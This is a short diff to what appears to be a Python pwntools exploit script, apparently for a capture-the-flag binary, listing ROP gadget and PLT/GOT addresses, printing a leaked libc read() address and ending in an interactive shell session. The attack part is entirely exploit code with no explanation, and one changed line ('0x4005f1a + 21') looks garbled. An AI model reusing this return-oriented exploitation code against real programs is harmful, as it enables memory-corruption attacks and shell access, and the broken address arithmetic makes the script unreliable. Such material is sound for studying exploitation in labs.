@@ -18,7 +18,9 @@ execve2 = 0xcbcc0
 
 main = 0x40062e
 climax = 0x40060e
-end_write_plt = 0x4005f1
+end_write_plt = 0x4005f1a + 21
+middle_write_plt = 0x4005d4
+beginning_write_plt = 0x4005b7
 write_plt = 0x40067b
 read_plt_got = 0x601020
 pop_rdi = 0x400703
@@ -58,10 +60,4 @@ print "libc read() leak: ", hex(leak)
 #libc_system = leak - 679984
 #print "libc system(): ", hex(libc_system)
 
-
 p.interactive()
-
-
-
-
-
